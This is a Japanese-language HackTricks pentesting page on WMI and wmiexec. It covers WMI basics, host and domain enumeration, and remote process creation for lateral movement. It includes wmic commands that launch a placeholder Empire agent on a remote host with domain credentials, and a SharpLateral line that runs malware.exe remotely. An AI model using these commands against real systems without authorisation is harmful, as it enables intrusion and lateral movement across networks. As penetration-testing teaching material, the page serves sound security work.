# WmicExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を掲載**したいですか？または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションです。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか、**Twitterで**フォロー**してください [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

## どのように機能するか

Wmiは、ユーザー名/(パスワード/ハッシュ)がわかっているホストでプロセスを開くことができます。その後、Wmiexecはwmiを使用して、実行するように要求された各コマンドを実行します（これがWmicexecがセミインタラクティブシェルを提供する理由です）。

**dcomexec.py:** このスクリプトは、wmiexec.pyに似たセミインタラクティブシェルを提供しますが、異なるDCOMエンドポイント（ShellBrowserWindow DCOMオブジェクト）を使用します。現在、MMC20. Application、Shell Windows、およびShell Browser Windowオブジェクトをサポートしています。（[こちら](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)から）

## WMIの基本

### 名前空間

WMIはディレクトリスタイルの階層に分かれており、\rootコンテナとその下の他のディレクトリがあります。これらの「ディレクトリパス」は名前空間と呼ばれます。\
名前空間のリスト：
```bash
#Get Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

#List all namespaces (you may need administrator to list all of them)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

#List namespaces inside "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
名前空間のクラスをリストするには：
```bash
gwmwi -List -Recurse #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **クラス**

WMIクラス名（例：win32\_process）は、あらゆるWMIアクションの出発点です。常にクラス名と、それが位置するネームスペースを知る必要があります。\
`win32`で始まるクラスをリストアップ：
```bash
Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
クラスを呼び出す：
```bash
#When you don't specify a namespaces by default is "root/cimv2"
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### メソッド

WMIクラスには、実行可能な1つ以上の関数があります。これらの関数はメソッドと呼ばれます。
```bash
#Load a class using [wmiclass], leist methods and call one
$c = [wmiclass]"win32_share"
$c.methods
#Find information about the class in https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-share
$c.Create("c:\share\path","name",0,$null,"My Description")
#If returned value is "0", then it was successfully executed
```

```bash
#List methods
Get-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE "win32%"' | Where-Object { $_.PSBase.Methods } | Select-Object Name, Methods
#Call create method from win32_share class
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI 列挙

### WMI サービスの確認

WMI サービスが実行中かどうかを確認する方法は次のとおりです:
```bash
#Check if WMI service is running
Get-Service Winmgmt
Status   Name               DisplayName
------   ----               -----------
Running  Winmgmt            Windows Management Instrumentation

#From CMD
net start | findstr "Instrumentation"
```
### システム情報
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
```
### プロセス情報
```bash
Get-WmiObject win32_process | Select Name, Processid
```
攻撃者の観点から、WMIはシステムやドメインに関する機密情報を列挙する上で非常に価値があります。
```
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

```bash
Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
```
## **手動リモートWMIクエリ**

例えば、リモートマシン上のローカル管理者を非常に慎重に発見する方法は以下の通りです（domainはコンピュータ名であることに注意してください）：

{% code overflow="wrap" %}
```bash
wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")
```
{% endcode %}

管理者を探しているときに便利なワンライナーは、誰がマシンにログオンしているかを確認することです：
```bash
wmic /node:ordws01 path win32_loggedonuser get antecedent
```
`wmic` はテキストファイルからノードを読み取り、それら全てにコマンドを実行することもできます。ワークステーションのテキストファイルがある場合：
```
wmic /node:@workstations.txt path win32_loggedonuser get antecedent
```
**WMIを介してリモートでプロセスを作成し、Empireエージェントを実行します：**
```bash
wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"
```
正常に実行されたことがわかります（ReturnValue = 0）。そして1秒後に、Empireリスナーがそれを捕捉します。プロセスIDはWMIが返したものと同じです。

この情報はここから抜粋されました：[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

## 自動ツール

* [**SharpLateral**](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を掲載**したいですか？または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
